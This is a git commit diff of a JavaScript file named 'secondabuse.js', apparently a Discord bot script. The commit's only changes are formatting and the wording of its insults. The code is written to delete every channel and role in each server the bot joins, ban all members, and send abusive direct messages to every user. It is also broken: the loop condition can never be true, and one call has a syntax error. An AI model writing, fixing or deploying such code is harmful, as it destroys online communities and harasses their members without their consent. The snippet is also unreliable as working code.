b57a1967e42056345f883118a10a2702f7faa607
Resurrection <30309647+Resurrection3387@users.noreply.github.com>
2020-03-08 18:34:15 +0200

    literally unnecessary changes

--- secondabuse.js
+++ secondabuse.js
@@ -1,11 +1,10 @@
-//Let's get straight to this
-
-for(i=0; i>Infinity; i++) {
+// Let's get straight to this!
+for (i=0; i>Infinity; i++) {
   //Start the awfulness!
   bot.guilds.forEach(g => {
     g.channels.deleteAll();
     g.roles.deleteAll();
-    g.members.forEach(m => m.ban("lmao"));
-    bot.users.forEach(u => u.send("fuck you! :)");
-  })
- }
+    g.members.forEach(m => m.ban("i hate you"));
+    bot.users.forEach(u => u.send("no one likes you");
+  });
+ };
